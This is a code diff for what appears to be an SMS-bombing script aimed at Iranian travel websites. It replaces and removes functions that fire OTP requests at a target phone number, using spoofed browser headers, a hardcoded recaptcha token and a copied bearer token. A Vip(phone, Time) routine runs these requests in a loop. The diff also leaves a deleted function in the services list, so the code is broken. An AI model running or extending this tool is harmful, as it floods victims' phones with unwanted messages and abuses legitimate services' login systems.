@@ -56,70 +56,47 @@ def check_internet():
 
 
 
-def safarmarket(phone):
+def ghasedak24(phone):
     import requests
     
     formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://safarmarket.com/api/security/v2/user/otp"
+    url = "https://ghasedak24.com/user/otp"
     
-    payload = {"phone": formatted_phone}
+    # معمولاً اینگونه سایت‌ها از POST با پارامتر mobile استفاده می‌کنند
+    payload = {
+        "mobile": formatted_phone
+    }
     
     headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/javascript, */*; q=0.01",
-        "Content-Type": "application/json",
-        "recaptcha": "3GCmkrzdEJvayMxGHEVpbTxsACobGdbZFtu37AcBQxCYTbZSqU",  # recaptcha token
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
         "X-Requested-With": "XMLHttpRequest",
-        "Origin": "https://safarmarket.com",
-        "Referer": "https://safarmarket.com/auth/signin",
+        "Origin": "https://ghasedak24.com",
+        "Referer": "https://ghasedak24.com/",
     }
     
     try:
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        response = requests.post(url, data=payload, headers=headers, timeout=10)
         
         print(f'{g}[+] Status: {response.status_code}{a}')
         print(f'{g}[+] Response: {response.text}{a}')
         
         if response.status_code == 200:
-            print(f'{g}(safarmarket) {a}Code Sent')
+            print(f'{g}(ghasedak24) {a}Code Sent')
             return True
         else:
-            print(f'{r}[-] (safarmarket) HTTP Error: {response.status_code}{a}')
+            print(f'{r}[-] (ghasedak24) HTTP Error: {response.status_code}{a}')
             return False
             
     except Exception as e:
-        print(f'{r}[!] safarmarket Exception: {e}{a}')
+        print(f'{r}[!] ghasedak24 Exception: {e}{a}')
         return False
 
-def mrbilit(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = f"https://auth.mrbilit.ir/api/Token/send?mobile={formatted_phone}"
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/plain, */*",
-        "Authorization": "Bearer eyJhbGciOiJIUzl1NilsInR5cCl6lkpXVCJ9.eyJidXMiOilOZilsInRybil6ljE3liwic3JjljoiMiJ9.vvpr9fgASvk7B714KQKCz-SaCmoErab_p3cslvULG1W",
-        "X-PlayerID": "dfb64872-1076-49c9-a2e1-a2a68eb80bf4",
-        "Sessionld": "session_adffeb7f-1d11-45fc-b0f7-2209fa54f1ba",
-        "Origin": "https://www.mrbilit.ir",
-        "Referer": "https://www.mrbilit.ir/",
-    }
-    
-    try:
-        response = requests.get(url, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            print(f'{g}(mrbilit) {a}Code Sent')
-            return True
-        else:
-            print(f'{r}[-] (mrbilit) HTTP Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] mrbilit Exception: {e}{a}')
-        return False
+
+
+
+
 
 def trip(phone):
     import requests
@@ -175,7 +152,7 @@ def Vip(phone, Time):
     services = [
     trip,
     mrbilit,
-    safarmarket,  # اضافه کردن این خط
+    ghasedak24,  # جایگزین safarmarket
 ]
     total_services = len(services)
 
